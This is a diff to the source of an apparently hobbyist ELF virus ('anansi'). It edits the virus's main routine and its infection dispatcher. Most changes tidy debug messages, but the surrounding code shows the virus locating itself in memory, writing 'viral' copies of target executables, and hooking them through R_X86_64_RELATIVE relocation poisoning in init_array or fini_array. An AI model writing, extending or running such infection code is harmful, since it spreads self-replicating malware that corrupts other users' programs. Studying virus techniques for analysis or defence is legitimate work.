@@ -187,14 +187,12 @@ void vx_main()
 	Elfbin target;
 
 	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;
-
 	uint8_t *vx_start = (uint8_t *)get_eip() - ((uint8_t *)&foobar - (uint8_t *)&real_start); //calculates the address of vx_main
-	char test_msg[] = "Infection Time\n";
-	anansi_write(STDOUT_FILENO, test_msg, anansi_strlen(test_msg));
 
 #ifdef DEBUG
 	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
 	anansi_printf("vx_size @ 0x%lx\n", vx_size);
+	anansi_printf("max_target @ %d\n", max_target);
 #endif
 
 	if(!(cwd = anansi_malloc(PATH_MAX))) {
@@ -267,7 +265,7 @@ int dispatch_infection(Elfbin *target)
 	use_reloc_poison = has_R_X86_64_RELATIVE(target, &desired_relocation);
 #ifdef DEBUG
 	if(use_reloc_poison) {
-		anansi_printf("R_X86_64_RELATIVE offset @ %lx and addend @ %lx\n", desired_relocation.r_offset, desired_relocation.r_addend);
+		anansi_printf("\t\t\tR_X86_64_RELATIVE offset @ %lx and addend @ %lx\n", desired_relocation.r_offset, desired_relocation.r_addend);
 	}
 #endif
 
@@ -293,17 +291,17 @@ int dispatch_infection(Elfbin *target)
 	anansi_strncpy(v_name, target->f_path, f_path_len);
 	anansi_strncpy(v_name + f_path_len, filename_append, 4);
 #ifdef DEBUG
-	anansi_printf("\t\t\tCreateding viral file %s\n", v_name);
+	anansi_printf("\t\t\tCreating viral file %s\n", v_name);
 #endif
 	fd_out = anansi_open(v_name, O_CREAT | O_WRONLY, S_IRWXU | S_IRGRP | S_IROTH);
 	if(fd_out < 0) {
 #ifdef DEBUG
-		anansi_printf("failure to open v_name\n");
+		anansi_printf("\t\t\tfailure to open v_name\n");
 #endif
 		return -1;
 	}
 #ifdef DEBUG
-	anansi_printf("new_size @@ %d\n", target->new_size);
+	anansi_printf("\t\t\tnew_size @ %lx\n", target->new_size);
 #endif
 	anansi_write(fd_out, target->write_only_mem, target->new_size);
 	anansi_close(fd_out);
@@ -423,7 +421,7 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 	char *random_section = get_random_int() % 2 ? init_array : fini_array;
 
 #ifdef DEBUG
-	anansi_printf("Targeting %s section for R_X86_64_RELATIVE poisoning/hooking", random_section);
+	anansi_printf("\t\t\tTargeting %s section for R_X86_64_RELATIVE poisoning/hooking\n", random_section);
 #endif
 
 	target->desired_rela_offset = rela_offset;
